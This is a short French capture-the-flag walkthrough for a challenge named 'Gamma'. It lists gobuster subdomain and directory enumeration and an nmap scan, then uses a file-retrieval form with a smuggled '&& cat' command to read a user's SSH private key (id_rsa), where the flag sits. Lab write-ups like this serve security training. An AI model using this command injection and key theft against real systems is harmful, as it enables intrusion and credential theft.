# Gamma

1) Chercher les sous domaines avec gobuster

```bash
gobuster dns -d rs.io -w hacker-toolkit/wordlists/common_subdomains.txt
```

2) Trouver le sous domaine `gamma.rs.io`

3) Scan de port avec nmap sur le sous domaine

```bash
nmap -sV -p- gamma.rs.io
```

4) Trouver le port 5536 avec un service nodejs qui tourne

5) On explore le site avec un scan de dirbuster

```bash
gobuster dir -u http://gamma.rs.io:5536 -w hacker-toolkit/wordlists/common_urls.txt
```

6) On trouve une page `/control` qui contient un formulaire permettant de récupérer les fichiers d'une machine distante

7) On récupère le fichier `/home/dev/.ssh/id_rsa && cat /home/dev/.ssh/id_rsa` de la machine distante

8) Ce fichier contient le flag

### Flag = ${FLAG_ElevatedRCE}